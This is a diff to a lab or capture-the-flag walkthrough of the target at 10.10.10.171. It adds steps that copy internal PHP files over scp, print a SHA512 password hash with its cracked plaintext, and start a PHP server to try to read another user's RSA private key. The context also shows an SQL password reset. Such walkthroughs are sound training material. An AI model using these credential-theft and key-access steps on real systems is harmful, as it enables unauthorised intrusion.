@@ -150,6 +150,36 @@ show columns from [table];
 update users set password = 'admin' where id =2;
 ```
 
+once connected as jimmy go to: `/var/www/internal`
+there are 3 files which we can donwload for inspection
+```
+scp jimmy@10.10.10.171:/var/www/internal/index.php ./Desktop/
+
+scp jimmy@10.10.10.171:/var/www/internal/main.php ./Desktop/
+
+scp jimmy@10.10.10.171:/var/www/internal/logout.php ./Desktop/
+```
+
+on the index.php file we can see the following SHA512 password:
+
+```
+00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1
+```
+
+using SHA512 dyrcpter the password is: `Revealed`
+
+to get to the files we need to start a php server on the /var/www/internal folder
+```
+php -S 10.10.10.171:8080
+```
+
+now browse to 10.10.10.171:8080 and interact with the files.
+the user is: `jimmy`
+password: `Revealed`
+
+now main.php should cat joanna's rsa key but running the php server as jimmy shows us Permission denied
+
+
 # Post Exploit
 
 # Flags
